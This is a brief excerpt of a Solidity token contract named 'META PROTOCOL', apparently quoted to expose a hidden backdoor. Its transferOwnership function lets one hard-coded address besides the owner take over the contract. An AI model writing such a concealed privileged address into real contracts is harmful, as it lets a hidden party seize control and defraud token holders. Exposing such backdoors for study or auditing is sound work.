...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xDAc28c6Ff4489a33D99fF34c7b95A996666dca6C));
...
contract METAPROTOCOL is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "META PROTOCOL";
  string private _name = "META PROTOCOL";
